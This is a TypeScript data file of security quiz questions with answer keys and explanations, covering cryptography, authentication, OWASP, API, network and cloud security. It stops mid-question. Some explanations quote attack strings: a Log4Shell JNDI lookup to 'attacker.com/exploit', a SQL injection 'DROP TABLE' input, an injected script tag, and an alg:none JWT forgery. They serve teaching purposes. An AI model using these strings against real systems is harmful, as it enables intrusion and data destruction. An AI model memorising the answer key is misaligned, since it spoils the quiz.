export interface QuizQuestion {
  id: string;
  chapterId: number;
  question: string;
  options: string[];
  answer: number; // 0-indexed
  explanation: string;
}

export const quizQuestions: QuizQuestion[] = [
  // ============================================================
  // Topic 1: Symmetric Encryption (chapterId: 1)
  // ============================================================
  {
    id: "t1-q1",
    chapterId: 1,
    question:
      "Why is ECB (Electronic Codebook) mode considered insecure for encrypting most data?",
    options: [
      "ECB uses a weaker encryption algorithm than other modes",
      "ECB encrypts each block independently, so identical plaintext blocks produce identical ciphertext blocks — leaking patterns in the data",
      "ECB does not support AES-256 key sizes",
      "ECB requires a larger IV than other modes, increasing overhead",
    ],
    answer: 1,
    explanation:
      "ECB encrypts each block independently with the same key. This means if two plaintext blocks are identical, their ciphertext blocks will also be identical, revealing patterns in the data. The famous 'ECB penguin' demonstrates this — encrypting an image in ECB mode preserves the outline of the image in the ciphertext. Other modes like CBC and CTR chain blocks together or use counters to ensure identical plaintext blocks produce different ciphertext blocks.",
  },
  {
    id: "t1-q2",
    chapterId: 1,
    question:
      "What is the primary advantage of AES-GCM over AES-CBC for modern applications?",
    options: [
      "AES-GCM uses a larger block size, providing more security",
      "AES-GCM is compatible with older TLS versions",
      "AES-GCM provides authenticated encryption — combining confidentiality and integrity/authenticity in a single operation, while CBC only provides confidentiality and is vulnerable to padding oracle attacks",
      "AES-GCM requires smaller keys than AES-CBC",
    ],
    answer: 2,
    explanation:
      "AES-GCM (Galois/Counter Mode) is an AEAD (Authenticated Encryption with Associated Data) cipher that provides both confidentiality (encryption) and integrity/authenticity (authentication tag) in a single operation. AES-CBC only provides confidentiality — it does not detect if the ciphertext has been tampered with, and is vulnerable to padding oracle attacks where error messages about invalid padding allow an attacker to decrypt data byte by byte. TLS 1.3 exclusively uses AEAD ciphers like AES-GCM.",
  },
  {
    id: "t1-q3",
    chapterId: 1,
    question:
      "What is envelope encryption and why is it used in cloud KMS systems?",
    options: [
      "Envelope encryption uses two layers of symmetric encryption with different algorithms for extra security",
      "Envelope encryption encrypts the data key with a master key — so rotating the master key only requires re-encrypting the small data keys, not re-encrypting all the actual data",
      "Envelope encryption wraps data in a digital signature before encrypting it",
      "Envelope encryption splits the data across multiple encryption keys for redundancy",
    ],
    answer: 1,
    explanation:
      "Envelope encryption uses a hierarchy: a master key (CMK/KEK) in the KMS encrypts data encryption keys (DEKs), which encrypt the actual data. When the master key needs to be rotated, only the DEKs need to be re-encrypted with the new master key — the actual data remains encrypted with the same DEK. Without envelope encryption, key rotation would require decrypting and re-encrypting potentially petabytes of data. AWS KMS, GCP Cloud KMS, and Azure Key Vault all use this pattern.",
  },

  // ============================================================
  // Topic 2: Asymmetric Encryption & PKI (chapterId: 2)
  // ============================================================
  {
    id: "t2-q1",
    chapterId: 2,
    question:
      "Why does RSA use hybrid encryption in practice rather than encrypting data directly?",
    options: [
      "RSA cannot encrypt data larger than its key size",
      "RSA encryption is approximately 1000x slower than AES — so RSA encrypts only a symmetric session key, which then encrypts the bulk data at high speed",
      "RSA ciphertext is always the same size as the plaintext, offering no compression",
      "RSA requires both parties to have RSA key pairs",
    ],
    answer: 1,
    explanation:
      "RSA's modular exponentiation operations are computationally expensive — roughly 1000x slower than AES for the same data volume. Additionally, RSA can only encrypt data smaller than its modulus (e.g., 256 bytes for RSA-2048). In hybrid encryption, RSA encrypts a random AES session key (32 bytes), and AES encrypts the actual data at hardware-accelerated speeds of several GB/s. This combines RSA's key distribution advantage with AES's performance.",
  },
  {
    id: "t2-q2",
    chapterId: 2,
    question:
      "What security advantage does Elliptic Curve Cryptography (ECC) provide over RSA?",
    options: [
      "ECC is immune to quantum computing attacks",
      "ECC provides equivalent security with much smaller key sizes — a 256-bit ECC key provides the same security as a 3072-bit RSA key, enabling faster operations and smaller certificates",
      "ECC can encrypt larger messages than RSA",
      "ECC does not require random number generation",
    ],
    answer: 1,
    explanation:
      "A 256-bit ECC key provides approximately 128 bits of security, equivalent to a 3072-bit RSA key. This dramatic size reduction means faster key generation, faster signing and verification, smaller certificates (important for TLS handshakes on mobile), and lower bandwidth consumption. ECC is NOT immune to quantum computing — Shor's algorithm works on both RSA and ECC. Post-quantum algorithms like CRYSTALS-Kyber are being developed to replace both.",
  },
  {
    id: "t2-q3",
    chapterId: 2,
    question:
      "What vulnerability did the DigiNotar CA compromise in 2011 expose about the PKI trust model?",
    options: [
      "That X.509 certificates can be forged without CA involvement",
      "That any trusted CA can issue certificates for any domain — so a single compromised CA can issue fraudulent certificates for any website, undermining the entire trust chain",
      "That certificate revocation is instantaneous and reliable",
      "That root CAs are never targeted by attackers",
    ],
    answer: 1,
    explanation:
      "The PKI trust model allows any trusted CA to issue a certificate for any domain. When DigiNotar was compromised, the attacker issued fraudulent certificates for *.google.com and other major domains, enabling man-in-the-middle attacks on Iranian users. This exposed the fundamental weakness: browsers trust ~150+ root CAs, and any one of them being compromised can issue valid certificates for any domain. This led to Certificate Transparency (CT) logs, which provide a public audit trail of all issued certificates.",
  },

  // ============================================================
  // Topic 3: Hashing & Digital Signatures (chapterId: 3)
  // ============================================================
  {
    id: "t3-q1",
    chapterId: 3,
    question:
      "Why is SHA-256 unsuitable for password hashing despite being a secure cryptographic hash function?",
    options: [
      "SHA-256 produces hashes that are too short to store passwords securely",
      "SHA-256 is not collision-resistant enough for password security",
      "SHA-256 is designed to be fast — attackers can compute billions of hashes per second on GPUs, making brute-force password cracking trivial without key stretching",
      "SHA-256 does not support salting",
    ],
    answer: 2,
    explanation:
      "SHA-256 is designed for speed — verifying file integrity and building Merkle trees requires fast hashing. This same speed is a vulnerability for password hashing: modern GPUs can compute over 10 billion SHA-256 hashes per second, allowing attackers to brute-force entire password databases quickly. Password hashing algorithms like bcrypt and Argon2 are deliberately slow (configurable work factor) and memory-hard, making each hash attempt take hundreds of milliseconds instead of nanoseconds.",
  },
  {
    id: "t3-q2",
    chapterId: 3,
    question:
      "Why is Argon2id recommended over bcrypt for new password hashing implementations?",
    options: [
      "Argon2id produces shorter hashes, saving storage space",
      "Argon2id uses a simpler algorithm that is easier to implement",
      "Argon2id is memory-hard — it requires significant RAM during hashing, making GPU and ASIC-based cracking dramatically more expensive, while bcrypt is compute-hard but not memory-hard",
      "Argon2id does not require salting, simplifying implementation",
    ],
    answer: 2,
    explanation:
      "bcrypt is compute-hard (tunable CPU cost) but uses minimal memory (~4 KB), so attackers can run thousands of parallel bcrypt instances on GPUs. Argon2id is both compute-hard and memory-hard — it can be configured to require megabytes of RAM per hash operation. Since GPUs have limited memory per core, this dramatically reduces the number of parallel hashing operations an attacker can run. Argon2id is the hybrid variant that combines data-dependent (Argon2d, GPU-resistant) and data-independent (Argon2i, side-channel-resistant) properties.",
  },
  {
    id: "t3-q3",
    chapterId: 3,
    question:
      "What catastrophic vulnerability does ECDSA have that Ed25519 eliminates?",
    options: [
      "ECDSA uses shorter keys than Ed25519",
      "ECDSA signatures are larger than Ed25519 signatures",
      "ECDSA requires a random nonce for each signature — if the same nonce is ever reused with the same key, the private key can be mathematically derived from the two signatures",
      "ECDSA is not compatible with TLS protocols",
    ],
    answer: 2,
    explanation:
      "ECDSA requires a unique random nonce (k) for every signature. If the same k is used twice with the same private key, an attacker can solve two equations with two unknowns to recover the private key. This is how Sony's PlayStation 3 code-signing key was extracted in 2010 — they used a static nonce. Ed25519 eliminates this vulnerability by deriving the nonce deterministically from the message and private key (RFC 6979-style), making nonce reuse impossible regardless of the quality of the random number generator.",
  },

  // ============================================================
  // Topic 4: Key Exchange & TLS (chapterId: 4)
  // ============================================================
  {
    id: "t4-q1",
    chapterId: 4,
    question:
      "Why is Diffie-Hellman key exchange vulnerable to man-in-the-middle attacks without authentication?",
    options: [
      "DH uses weak encryption that can be broken in real-time",
      "DH key exchange has no built-in way to verify the identity of the other party — an attacker can perform separate DH exchanges with each party, relaying messages between them while reading and modifying the plaintext",
      "DH requires both parties to share a secret key in advance",
      "DH public values reveal the shared secret to any observer",
    ],
    answer: 1,
    explanation:
      "In a bare DH exchange, neither Alice nor Bob can verify who they are communicating with. An attacker (Mallory) can intercept Alice's public value, perform a separate DH exchange with Alice (deriving shared secret S1), and another with Bob (deriving shared secret S2). Mallory decrypts Alice's messages with S1, reads/modifies them, re-encrypts with S2, and forwards to Bob. Both Alice and Bob think they have a secure channel, but Mallory sees everything. This is why DH is always combined with authentication — TLS uses certificates to authenticate the server's DH public value.",
  },
  {
    id: "t4-q2",
    chapterId: 4,
    question:
      "How does TLS 1.3 reduce handshake latency compared to TLS 1.2?",
    options: [
      "TLS 1.3 uses faster encryption algorithms",
      "TLS 1.3 skips certificate validation",
      "TLS 1.3 completes the handshake in 1-RTT by sending the client's key share in the first message — compared to TLS 1.2's 2-RTT handshake where key exchange parameters are negotiated in a separate round trip",
      "TLS 1.3 reuses the previous session's encryption keys",
    ],
    answer: 2,
    explanation:
      "In TLS 1.2, the client first sends supported cipher suites (ClientHello), the server responds with its choice and certificate (ServerHello), then a separate key exchange round trip occurs. TLS 1.3 combines these: the client sends its key shares (ECDHE public values for all supported groups) in the ClientHello, and the server can immediately compute the shared secret and respond with encrypted data. This reduces the handshake from 2-RTT to 1-RTT, cutting connection setup time in half.",
  },
  {
    id: "t4-q3",
    chapterId: 4,
    question:
      "What does Perfect Forward Secrecy protect against that standard RSA key exchange does not?",
    options: [
      "PFS prevents brute-force attacks on the encryption algorithm",
      "PFS uses longer encryption keys for stronger security",
      "PFS prevents an attacker who records encrypted traffic and later obtains the server's private key from decrypting past sessions — because each session used ephemeral keys that were discarded",
      "PFS eliminates the need for certificate validation",
    ],
    answer: 2,
    explanation:
      "With static RSA key exchange (TLS 1.2), the client encrypts the session key with the server's RSA public key. If an attacker records this traffic and later obtains the server's private key (through theft, legal compulsion, or a future quantum computer), they can decrypt the recorded session key and then all the recorded traffic. With PFS (ephemeral DH/ECDHE), each session generates fresh key pairs that are discarded after use. Even with the server's long-term private key, the attacker cannot recover the ephemeral session keys. TLS 1.3 mandates PFS by removing RSA key exchange entirely.",
  },

  // ============================================================
  // Topic 5: Authentication Protocols (chapterId: 5)
  // ============================================================
  {
    id: "t5-q1",
    chapterId: 5,
    question:
      "Why are FIDO2/WebAuthn hardware security keys considered phishing-resistant while TOTP codes are not?",
    options: [
      "Hardware keys use longer codes than TOTP",
      "Hardware keys store the user's password more securely",
      "Hardware keys cryptographically bind the authentication to the relying party's origin — the key will not authenticate if the browser's URL doesn't match the registered domain, making phishing sites unable to obtain valid credentials",
      "Hardware keys require biometric verification that TOTP does not",
    ],
    answer: 2,
    explanation:
      "When a FIDO2 key authenticates, the browser sends the current website's origin (e.g., 'https://accounts.google.com') to the hardware key. The key checks this against the registered relying party origin and will refuse to authenticate if they don't match. A phishing site at 'https://accounts-google.evil.com' would have a different origin, so the key simply won't respond. TOTP codes have no such binding — the user generates a valid code and can be tricked into entering it on any site, including a phishing site that replays it to the real site in real-time.",
  },
  {
    id: "t5-q2",
    chapterId: 5,
    question:
      "Why is the OAuth 2.0 Implicit flow deprecated in favor of Authorization Code + PKCE?",
    options: [
      "The Implicit flow requires more network round trips",
      "The Implicit flow returns tokens directly in the URL fragment — exposing them in browser history, server logs, and referrer headers — while Authorization Code + PKCE exchanges a one-time code for tokens in a secure back-channel request",
      "The Implicit flow does not support refresh tokens or scopes",
      "The Implicit flow only works with confidential clients",
    ],
    answer: 1,
    explanation:
      "The Implicit flow returns the access token directly in the URL fragment (#access_token=...) after authorization. This token is visible in browser history, can leak via the Referer header if the page has external links, and may be logged by proxy servers. The flow also cannot use refresh tokens (no secure storage for the client secret needed for token exchange). Authorization Code + PKCE returns a short-lived authorization code that is exchanged for tokens via a POST request, keeping tokens out of URLs. PKCE (Proof Key for Code Exchange) prevents authorization code interception attacks.",
  },
  {
    id: "t5-q3",
    chapterId: 5,
    question:
      "What is the key difference between OpenID Connect (OIDC) and OAuth 2.0?",
    options: [
      "OIDC uses XML while OAuth 2.0 uses JSON",
      "OIDC replaces OAuth 2.0 entirely with a more secure protocol",
      "OAuth 2.0 is an authorization framework (granting access to resources), while OIDC adds an authentication layer on top — providing a standardized ID Token (JWT) that proves the user's identity",
      "OIDC only works with SAML identity providers",
    ],
    answer: 2,
    explanation:
      "OAuth 2.0 is strictly an authorization protocol — it grants third-party applications access to resources (via access tokens) without sharing credentials, but it does NOT provide information about WHO the user is. OIDC adds an identity layer by introducing the ID Token — a signed JWT containing claims about the user (sub, email, name, etc.) — and standardized endpoints (UserInfo, Discovery) for retrieving user information. When you see 'Sign in with Google,' that's OIDC providing authentication on top of OAuth 2.0's authorization.",
  },

  // ============================================================
  // Topic 6: Authorization & Access Control (chapterId: 6)
  // ============================================================
  {
    id: "t6-q1",
    chapterId: 6,
    question:
      "When would you choose ABAC over RBAC for access control?",
    options: [
      "When you have fewer than 10 users in the system",
      "When all users have the same permissions",
      "When access decisions depend on contextual attributes (time of day, user department, resource classification, location) — not just the user's role — enabling policies like 'doctors can access patient records only during their shift in their department'",
      "When you want to simplify the access control system",
    ],
    answer: 2,
    explanation:
      "RBAC maps permissions to roles and roles to users — it works well for coarse-grained access (admin vs viewer) but struggles with context-dependent decisions. ABAC evaluates policies against multiple attributes: subject (user.department, user.clearance), resource (document.classification), action (read, write), and environment (time, location). This enables fine-grained policies that RBAC would require hundreds of roles to express. For example, 'only finance department managers can approve expenses over $10,000 during business hours' requires ABAC's attribute evaluation.",
  },
  {
    id: "t6-q2",
    chapterId: 6,
    question:
      "What is the 'alg: none' vulnerability in JWTs?",
    options: [
      "The JWT encryption algorithm is too weak to prevent decryption",
      "The JWT signature uses a deprecated hashing algorithm",
      "An attacker modifies the JWT header to specify 'alg: none' and removes the signature — if the JWT library accepts unsigned tokens, the server trusts the modified claims without any cryptographic verification",
      "The JWT payload is not encrypted, allowing anyone to read the claims",
    ],
    answer: 2,
    explanation:
      "The JWT specification includes 'none' as a valid algorithm for unsecured JWTs (used in trusted environments). If a JWT library does not explicitly reject 'alg: none' tokens, an attacker can take any valid JWT, change the header to {\"alg\": \"none\"}, modify the payload claims (e.g., change 'role: user' to 'role: admin'), remove the signature, and send this unsigned token to the server. The vulnerable library sees 'alg: none,' skips signature verification, and accepts the forged claims. Every JWT library must explicitly deny 'none' algorithm tokens.",
  },
  {
    id: "t6-q3",
    chapterId: 6,
    question:
      "Why does refresh token rotation detect stolen tokens?",
    options: [
      "Rotated tokens use stronger encryption than non-rotated tokens",
      "Each refresh token can only be used once — when a new access token is issued, a new refresh token replaces the old one, so if an attacker uses a stolen token, the legitimate user's next refresh attempt uses the invalidated old token, alerting the system",
      "Rotated tokens include the client's IP address for verification",
      "Token rotation reduces the token's expiration time automatically",
    ],
    answer: 1,
    explanation:
      "With refresh token rotation, each time a refresh token is used, it is invalidated and a new one is issued. If an attacker steals and uses a refresh token, they receive a new token (and so does the system). When the legitimate user tries to use their now-invalidated refresh token, the authorization server detects that an already-used token is being presented — indicating theft. The server can then invalidate all tokens for that user, forcing re-authentication. Without rotation, a stolen refresh token remains valid until it expires (which could be weeks).",
  },

  // ============================================================
  // Topic 7: Identity & Zero Trust (chapterId: 7)
  // ============================================================
  {
    id: "t7-q1",
    chapterId: 7,
    question:
      "What is the primary security risk of Single Sign-On (SSO)?",
    options: [
      "SSO requires users to remember more passwords",
      "SSO is incompatible with multi-factor authentication",
      "SSO creates a single point of failure — if the Identity Provider (IdP) is compromised, the attacker gains access to ALL connected applications because they all trust the IdP's authentication assertions",
      "SSO only works within a single application",
    ],
    answer: 2,
    explanation:
      "SSO concentrates authentication trust in the Identity Provider. If the IdP is compromised (through credential theft, vulnerability exploitation, or insider threat), the attacker can generate valid authentication assertions for any user to any connected Service Provider. This is why IdP security is paramount — it should have the strongest authentication (hardware MFA, privileged access controls), monitoring, and incident response capabilities. The 2020 SolarWinds attack partly exploited this by compromising SAML token signing to access connected services.",
  },
  {
    id: "t7-q2",
    chapterId: 7,
    question:
      "How does Zero Trust architecture differ from traditional perimeter-based (castle-and-moat) security?",
    options: [
      "Zero Trust uses stronger firewalls at the network perimeter",
      "Zero Trust encrypts all data at rest, while perimeter security does not",
      "Zero Trust assumes no implicit trust based on network location — every request is authenticated and authorized regardless of whether it originates inside or outside the corporate network, while perimeter security trusts all internal traffic",
      "Zero Trust eliminates the need for any authentication",
    ],
    answer: 2,
    explanation:
      "Traditional perimeter security operates like a castle and moat — a strong perimeter (firewall, VPN) protects the network, but once inside, users and systems are implicitly trusted. Zero Trust eliminates this implicit trust, treating the internal network as equally hostile as the internet. Every request must be authenticated (verify identity), authorized (check permissions), and encrypted, regardless of network location. This prevents lateral movement — if an attacker breaches one system, they cannot freely access other internal systems without passing authentication and authorization checks.",
  },
  {
    id: "t7-q3",
    chapterId: 7,
    question:
      "What is the purpose of Just-In-Time (JIT) access in Privileged Access Management?",
    options: [
      "JIT access provides permanent admin privileges to trusted users",
      "JIT access speeds up the login process for administrators",
      "JIT access grants elevated privileges only when needed and for a limited duration — reducing the window during which compromised credentials can be misused and minimizing the standing privilege attack surface",
      "JIT access automatically rotates all passwords in the organization",
    ],
    answer: 2,
    explanation:
      "JIT access eliminates standing privileges — instead of administrators having permanent root/admin access (which can be exploited 24/7 if their credentials are stolen), they request elevated access when needed. The request is approved (manually or automatically based on policy), access is granted for a defined period (e.g., 2 hours), and then automatically revoked. This reduces the attack surface from 'admin credentials compromised = permanent access' to 'admin credentials compromised = access only if the attacker can also navigate the JIT approval process within the time window.'",
  },

  // ============================================================
  // Topic 8: OWASP Top 10 (chapterId: 8)
  // ============================================================
  {
    id: "t8-q1",
    chapterId: 8,
    question:
      "Why do parameterized queries prevent SQL injection while string concatenation does not?",
    options: [
      "Parameterized queries encrypt the SQL statement",
      "Parameterized queries run in a sandboxed environment",
      "Parameterized queries separate SQL code from data — the database pre-compiles the SQL structure and treats parameter values as literal data that can never be interpreted as SQL syntax, regardless of what the input contains",
      "Parameterized queries automatically validate input length and type",
    ],
    answer: 2,
    explanation:
      "With string concatenation ('SELECT * FROM users WHERE id = ' + userInput), the database receives a single string and must parse both SQL and data together — malicious input like '1; DROP TABLE users' becomes part of the SQL syntax. With parameterized queries ('SELECT * FROM users WHERE id = $1', [userInput]), the SQL structure is compiled first (the database knows exactly where the data placeholder is), then the input is bound as a data value. Even if the input is '1; DROP TABLE users', the database treats the entire string as a literal value for comparison, not as SQL code.",
  },
  {
    id: "t8-q2",
    chapterId: 8,
    question:
      "How does Content Security Policy (CSP) mitigate Cross-Site Scripting (XSS)?",
    options: [
      "CSP encrypts all script files to prevent tampering",
      "CSP automatically removes malicious scripts from HTML",
      "CSP headers tell the browser which sources of scripts are allowed to execute — even if an attacker injects a script tag via XSS, the browser blocks it if it violates the CSP policy (e.g., inline scripts blocked by 'script-src self')",
      "CSP replaces JavaScript with a safer scripting language",
    ],
    answer: 2,
    explanation:
      "Content Security Policy is a defense-in-depth mechanism. The server sends a CSP header (e.g., 'Content-Security-Policy: script-src 'self'') that instructs the browser to only execute scripts loaded from the same origin. If an attacker injects '<script>evil()</script>' via XSS, the browser sees this is an inline script (not from 'self') and refuses to execute it. CSP can also restrict where images, styles, fonts, and frames can be loaded from, limit form submission targets, and report violations to a monitoring endpoint. CSP doesn't prevent injection but dramatically reduces its impact.",
  },
  {
    id: "t8-q3",
    chapterId: 8,
    question:
      "What is credential stuffing and why is it effective?",
    options: [
      "Credential stuffing randomly generates username/password combinations to guess credentials",
      "Credential stuffing exploits SQL injection to extract credentials from databases",
      "Credential stuffing uses username/password pairs leaked from breaches on other sites — it is effective because users reuse passwords across services, so credentials from one breach often work on multiple other sites",
      "Credential stuffing intercepts credentials in transit between the user and server",
    ],
    answer: 2,
    explanation:
      "Credential stuffing is an automated attack that takes username/password pairs from data breaches (billions of credentials are available from major breaches like LinkedIn, Yahoo, Adobe) and systematically tries them on other services. Studies show 65% of users reuse passwords, so a significant percentage of stolen credentials work on other sites. Defenses include MFA (even if the password works, the second factor blocks access), rate limiting login attempts, breach password checking (comparing submitted passwords against known breach databases like HaveIBeenPwned), and CAPTCHA on login forms.",
  },

  // ============================================================
  // Topic 9: API Security (chapterId: 9)
  // ============================================================
  {
    id: "t9-q1",
    chapterId: 9,
    question:
      "Why does per-IP rate limiting fail against distributed attacks and users behind NAT?",
    options: [
      "IP addresses change too frequently to track",
      "Per-IP rate limiting uses too much server memory",
      "Distributed attacks use thousands of different IPs (botnets), each staying under the per-IP limit, while legitimate users behind NAT/corporate proxies share a single IP and collectively exceed the limit — unfairly blocking real users while missing attackers",
      "IP addresses cannot be reliably determined from HTTP requests",
    ],
    answer: 2,
    explanation:
      "Per-IP rate limiting assumes one IP = one user, which fails in two directions. Attackers with botnets distribute requests across thousands of IPs, each sending only a few requests that individually stay under the rate limit but collectively overwhelm the server. Meanwhile, all users behind a corporate NAT or proxy share a single IP — 1000 legitimate employees making normal requests from the same IP will collectively exceed the rate limit, blocking real users. More effective approaches include per-user/per-API-key rate limiting (requires authentication first) and behavioral analysis.",
  },
  {
    id: "t9-q2",
    chapterId: 9,
    question:
      "Why should Access-Control-Allow-Origin never be set to '*' (wildcard) for authenticated APIs?",
    options: [
      "The wildcard character causes parsing errors in some browsers",
      "Wildcard origins disable HTTP caching for API responses",
      "A wildcard allows any website to make cross-origin requests to your API — combined with credentials (cookies), any malicious site a user visits could silently make authenticated API calls and steal their data",
      "Wildcard origins prevent the API from using HTTPS",
    ],
    answer: 2,
    explanation:
      "CORS with 'Access-Control-Allow-Origin: *' tells browsers that any website can make requests to your API. For unauthenticated public APIs this is fine, but for authenticated APIs it means a malicious site like evil.com could make AJAX requests to your API using the user's cookies. The user visits evil.com, which silently calls your-api.com/account — the browser includes the user's session cookie, and the API returns the user's private data to evil.com. Note: browsers actually prevent '*' with 'credentials: include,' but misconfigured servers that dynamically reflect the Origin header achieve the same insecure effect.",
  },
  {
    id: "t9-q3",
    chapterId: 9,
    question:
      "How does API request signing (like AWS SigV4) differ from bearer token authentication?",
    options: [
      "Request signing uses symmetric encryption while bearer tokens use asymmetric encryption",
      "Request signing generates a signature over the entire request (method, URL, headers, body) using HMAC — proving both sender identity and request integrity, while a bearer token only proves identity and doesn't protect against request tampering",
      "Request signing is faster than bearer token validation",
      "Bearer tokens are more secure because they use longer keys",
    ],
    answer: 1,
    explanation:
      "Bearer tokens are opaque strings included in the Authorization header — they prove the caller has the token (identity) but don't protect the request itself. An attacker who intercepts a bearer token can make any API call with it. Request signing (AWS SigV4) creates an HMAC-SHA256 signature over the HTTP method, URL, headers, and body. If any part of the request is modified in transit, the signature becomes invalid. The signing key is never transmitted — only the signature is sent. This provides both authentication (only someone with the secret key can produce a valid signature) and integrity (the request cannot be tampered with).",
  },

  // ============================================================
  // Topic 10: Secure Development (chapterId: 10)
  // ============================================================
  {
    id: "t10-q1",
    chapterId: 10,
    question:
      "What does the 'E' in STRIDE stand for, and what security property does it violate?",
    options: [
      "Encryption — violates Confidentiality",
      "Elevation of Privilege — violates Authorization by allowing a user to gain access or capabilities beyond what they are permitted",
      "Exfiltration — violates Data Integrity",
      "Enumeration — violates Privacy",
    ],
    answer: 1,
    explanation:
      "STRIDE stands for Spoofing (violates Authentication), Tampering (violates Integrity), Repudiation (violates Non-repudiation), Information Disclosure (violates Confidentiality), Denial of Service (violates Availability), and Elevation of Privilege (violates Authorization). Elevation of Privilege occurs when an attacker gains unauthorized access levels — for example, a regular user exploiting a vulnerability to gain admin privileges, or escaping a container to access the host system. Defenses include input validation, principle of least privilege, and proper authorization checks at every access boundary.",
  },
  {
    id: "t10-q2",
    chapterId: 10,
    question:
      "What is the key difference between SAST and DAST security scanning?",
    options: [
      "SAST scans network traffic while DAST scans source code",
      "SAST can only find known vulnerabilities while DAST finds unknown ones",
      "SAST analyzes source code without running the application (white-box, finding issues like hardcoded secrets and SQL concatenation), while DAST tests the running application from the outside (black-box, finding issues like XSS and misconfigurations)",
      "SAST is run in production while DAST is run during development",
    ],
    answer: 2,
    explanation:
      "SAST (Static AST) examines source code, bytecode, or binaries to find vulnerability patterns without executing the code — it can detect issues like SQL injection (string concatenation in queries), hardcoded credentials, insecure deserialization, and buffer overflows. DAST (Dynamic AST) sends malicious requests to a running application to find exploitable vulnerabilities — it discovers runtime issues like XSS (by injecting script tags), security misconfigurations, and authentication bypass. SAST runs early in CI/CD (on commits), while DAST runs against deployed staging environments.",
  },
  {
    id: "t10-q3",
    chapterId: 10,
    question:
      "Why was the Log4Shell vulnerability (CVE-2021-44228) so impactful?",
    options: [
      "Log4j had weak encryption that allowed data breaches",
      "Log4j was only used in a few critical applications",
      "Log4j is a ubiquitous Java logging library used in millions of applications — a single vulnerability in this transitive dependency enabled remote code execution, and many organizations didn't even know they were using Log4j because it was pulled in by other dependencies",
      "Log4j's vulnerability only affected development environments, not production",
    ],
    answer: 2,
    explanation:
      "Log4Shell allowed remote code execution by simply logging a specially crafted string (e.g., '${jndi:ldap://attacker.com/exploit}'). Log4j is used by virtually every Java application either directly or as a transitive dependency (pulled in by other libraries). Many organizations didn't know they were vulnerable because Log4j was buried deep in their dependency trees. This highlighted the critical importance of Software Composition Analysis (SCA) — knowing what dependencies your application uses, including transitive ones, and monitoring them for vulnerabilities.",
  },

  // ============================================================
  // Topic 11: Network Security (chapterId: 11)
  // ============================================================
  {
    id: "t11-q1",
    chapterId: 11,
    question:
      "What is the key difference between an IDS and an IPS?",
    options: [
      "IDS uses more advanced detection algorithms than IPS",
      "IDS monitors more network traffic than IPS",
      "IDS passively monitors traffic and generates alerts when it detects suspicious activity, while IPS sits inline in the traffic path and actively blocks malicious traffic in real-time — IDS detects, IPS prevents",
      "IPS only works at the application layer while IDS works at all layers",
    ],
    answer: 2,
    explanation:
      "An IDS (Intrusion Detection System) operates in passive/monitoring mode — it receives a copy of network traffic (via port mirroring or network tap), analyzes it for malicious patterns, and generates alerts. It does not interfere with traffic flow. An IPS (Intrusion Prevention System) sits inline — all traffic passes through it, and it can actively drop malicious packets, reset connections, or quarantine traffic in real-time. The tradeoff is that IPS can cause disruption if it incorrectly blocks legitimate traffic (false positives), while IDS only alerts without blocking.",
  },
  {
    id: "t11-q2",
    chapterId: 11,
    question:
      "Why is WireGuard considered more secure than OpenVPN despite having fewer features?",
    options: [
      "WireGuard uses proprietary encryption algorithms that are stronger",
      "WireGuard runs on dedicated hardware accelerators",
      "WireGuard has a minimal codebase (~4,000 lines vs OpenVPN's ~100,000) that is easier to audit for vulnerabilities, uses only modern cryptography (Curve25519, ChaCha20, Poly1305), and operates in kernel space for better performance",
      "WireGuard encrypts traffic twice for extra security",
    ],
    answer: 2,
    explanation:
      "Security correlates with code simplicity — fewer lines of code mean fewer potential vulnerabilities and a codebase that can be comprehensively audited. WireGuard's ~4,000 lines (vs OpenVPN's ~100,000+) make it realistically auditable by a single security researcher. WireGuard also eliminates cipher negotiation (a source of downgrade attacks) by using only modern algorithms (Curve25519 for key exchange, ChaCha20-Poly1305 for symmetric encryption). Its kernel-space implementation reduces context switches and provides better throughput than OpenVPN's userspace approach.",
  },
  {
    id: "t11-q3",
    chapterId: 11,
    question:
      "How do DNS amplification DDoS attacks achieve their amplification effect?",
    options: [
      "The attacker compromises DNS servers to generate extra traffic",
      "The attacker sends small DNS queries with a spoofed source IP (the victim's) to open DNS resolvers — the resolvers send much larger DNS responses to the victim, amplifying the attack traffic by 50-100x",
      "The attacker uses DNS to redirect all internet traffic to the victim",
      "The attacker exploits DNS cache poisoning to flood the victim",
    ],
    answer: 1,
    explanation:
      "DNS amplification exploits two properties: UDP source IP spoofing (the attacker forges the victim's IP as the source) and response amplification (a small DNS query like 'ANY isc.org' produces a much larger response). The attacker sends thousands of small (~60 byte) queries to open DNS resolvers with the victim's IP as the source. Each resolver sends its large (~3000 byte) response to the victim — a 50x amplification. With thousands of resolvers, the attacker can generate hundreds of Gbps of traffic from a much smaller attack bandwidth. Defenses include BCP38 (ingress filtering to prevent IP spoofing) and rate-limiting DNS responses.",
  },

  // ============================================================
  // Topic 12: Cloud Security (chapterId: 12)
  // ============================================================
  {
    id: "t12-q1",
    chapterId: 12,
    question:
      "What does the cloud shared responsibility model mean for security?",
    options: [
      "The cloud provider is responsible for all security in the cloud",
      "The customer is responsible for all security, including physical infrastructure",
      "The cloud provider secures the infrastructure (physical, hypervisor, network) while the customer is responsible for securing their data, configurations, identities, and applications running on the infrastructure",
      "Security responsibilities are negotiated individually with each cloud provider",
    ],
    answer: 2,
    explanation:
      "The shared responsibility model divides security duties. The cloud provider handles 'security OF the cloud' — physical data center security, hypervisor patching, network infrastructure, and hardware maintenance. The customer handles 'security IN the cloud' — IAM configuration, network security groups, data encryption, application security, OS patching (for IaaS), and access management. Many cloud security breaches occur because customers assume the provider handles everything. For example, S3 buckets exposed publicly are a customer configuration error, not an AWS security failure.",
  },
  {
    id: "t12-q2",
    chapterId: 12,
    question:
      "Why should IAM roles with temporary credentials be used instead of long-lived access keys?",
    options: [
      "IAM roles are easier to type than access keys",
      "IAM roles provide higher API rate limits",
      "IAM roles issue temporary credentials that automatically expire and rotate — if leaked, they are valid only for a limited time (15 min to 12 hours), while long-lived access keys remain valid until manually rotated and are frequently leaked in code repositories",
      "IAM roles can only access fewer services than access keys",
    ],
    answer: 2,
    explanation:
      "Long-lived access keys (AWS_ACCESS_KEY_ID/AWS_SECRET_ACCESS_KEY) are static credentials that remain valid until manually revoked. They are frequently accidentally committed to Git repositories, embedded in Docker images, or stored in plaintext configuration files. IAM roles (EC2 instance profiles, Lambda execution roles, ECS task roles) provide temporary credentials via the instance metadata service that automatically rotate every few hours. If leaked, temporary credentials expire on their own. AWS Security Hub reports that exposed access keys are the most common finding in cloud security incidents.",
  },
  {
    id: "t12-q3",
    chapterId: 12,
    question:
      "What is the difference between SOC 2 Type I and Type II reports?",
    options: [
